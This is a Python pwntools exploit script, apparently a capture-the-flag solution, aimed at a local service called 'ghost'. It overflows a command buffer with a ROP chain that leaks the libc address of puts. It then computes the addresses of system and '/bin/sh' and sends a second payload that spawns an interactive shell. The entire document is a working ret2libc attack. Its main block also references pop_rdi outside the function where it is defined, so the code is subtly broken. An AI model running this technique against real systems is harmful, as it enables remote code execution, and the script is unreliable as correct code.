from pwn import *

context.binary = elf = ELF("./ghost")
context.log_level = "debug"

HOST, PORT = "127.0.0.1", 1337
OFFSET = 72

def leak_puts_got():
    """Leak the actual puts@got address"""
    p = remote(HOST, PORT)
    
    p.sendlineafter(b"Username:", b"operator")
    p.sendlineafter(b"Password:", b"ghostop")
    p.recvuntil(b"ghostshell> ")
    
    pop_rdi = 0x40131e
    puts_plt = 0x401140
    puts_got = 0x404020
    
    log.info(f"Leaking puts@got at {hex(puts_got)}")
    
    payload = b"status" + b"A"*66
    payload += p64(pop_rdi)
    payload += p64(puts_got)
    payload += p64(puts_plt)
    
    p.sendline(payload)
    
    # Read the output
    # The program will print:
    # 1. "[*] System nominal. All nodes operational."
    # 2. A newline
    # 3. The actual output from puts (which is the address in libc)
    # 4. Probably a newline after that
    
    # First, consume everything until we get to the actual leak
    p.recvuntil(b"System nominal. All nodes operational.")
    p.recvline()  # Consume the newline
    
    # Now read the leak - it should be 8 bytes but might have a newline after
    # Let's read until we get 8 bytes that aren't newlines
    leak_bytes = b''
    while len(leak_bytes) < 8:
        chunk = p.recv(1)
        if chunk != b'\n':
            leak_bytes += chunk
        elif leak_bytes:  # If we already have some bytes and get a newline, stop
            break
    
    log.info(f"Leak bytes: {leak_bytes.hex()}")
    
    if len(leak_bytes) >= 8:
        # Pad to 8 bytes if necessary (for 6-byte addresses)
        leak_bytes = leak_bytes.ljust(8, b'\x00')
        leaked_addr = u64(leak_bytes)
        log.success(f"Leaked puts address: {hex(leaked_addr)}")
        return leaked_addr
    
    return None

if __name__ == "__main__":
    leaked = leak_puts_got()
    if leaked:
        libc = ELF("./libc.so.6")
        libc_base = leaked - libc.sym['puts']
        log.success(f"Libc base: {hex(libc_base)}")
        
        system_addr = libc_base + libc.sym['system']
        binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
        
        log.info(f"system: {hex(system_addr)}")
        log.info(f"binsh: {hex(binsh_addr)}")
        
        # Now let's try to get a shell (we'll need a new connection)
        p2 = remote(HOST, PORT)
        p2.sendlineafter(b"Username:", b"operator")
        p2.sendlineafter(b"Password:", b"ghostop")
        p2.recvuntil(b"ghostshell> ")
        
        # Stack alignment ret gadget
        ret = 0x40131f  # The ret instruction from protocol_teardown
        
        payload2 = b"status" + b"A"*66
        payload2 += p64(ret)  # Align stack
        payload2 += p64(pop_rdi)
        payload2 += p64(binsh_addr)
        payload2 += p64(system_addr)
        
        p2.sendline(payload2)
        p2.interactive()
